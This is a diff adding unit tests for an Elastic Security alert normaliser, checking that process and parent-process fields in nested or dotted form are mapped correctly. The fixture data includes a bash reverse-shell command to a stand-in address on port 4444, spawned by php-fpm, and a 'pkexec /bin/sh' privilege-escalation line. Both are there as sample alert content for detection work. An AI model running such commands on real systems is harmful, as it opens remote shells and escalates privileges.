@@ -505,3 +505,56 @@ describe("ElasticSecurityNormalizer", () => {
     });
   });
 });
+
+/*
+ * ECS names the process the source event is about (process.*) and its
+ * parent (process.parent.*) - exactly Sigma's Image, CommandLine,
+ * ParentImage and ParentCommandLine - nested or dotted.
+ */
+describe("ElasticSecurityNormalizer: the process the alert is about", () => {
+  test("process.* and process.parent.*", () => {
+    const event: NormalizedSecurityEvent = ElasticSecurityNormalizer.normalize(
+      alertHit(),
+    );
+
+    expect(event.processName).toBe("pkexec");
+    expect(event.processPath).toBe("/usr/bin/pkexec");
+    expect(event.processCommandLine).toBe("pkexec /bin/sh");
+    expect(event.parentProcessName).toBe("bash");
+    expect(event.parentProcessPath).toBe("");
+    expect(event.parentProcessCommandLine).toBe("");
+  });
+
+  test("dotted keys read the same as nested ones", () => {
+    const event: NormalizedSecurityEvent = ElasticSecurityNormalizer.normalize({
+      "kibana.alert.rule.name": "Reverse Shell",
+      "process.name": "bash",
+      "process.executable": "/usr/bin/bash",
+      "process.command_line": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+      "process.parent.name": "php-fpm8.2",
+      "process.parent.executable": "/usr/sbin/php-fpm8.2",
+      "process.parent.command_line": "php-fpm: pool www",
+    });
+
+    expect(event.processName).toBe("bash");
+    expect(event.processPath).toBe("/usr/bin/bash");
+    expect(event.processCommandLine).toBe(
+      "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+    );
+    expect(event.parentProcessName).toBe("php-fpm8.2");
+    expect(event.parentProcessPath).toBe("/usr/sbin/php-fpm8.2");
+    expect(event.parentProcessCommandLine).toBe("php-fpm: pool www");
+  });
+
+  test("an alert without a process names none", () => {
+    const source: JSONObject = alertSource();
+    delete source["process"];
+
+    const event: NormalizedSecurityEvent =
+      ElasticSecurityNormalizer.normalize(source);
+
+    expect(event.processName).toBe("");
+    expect(event.processCommandLine).toBe("");
+    expect(event.parentProcessName).toBe("");
+  });
+});
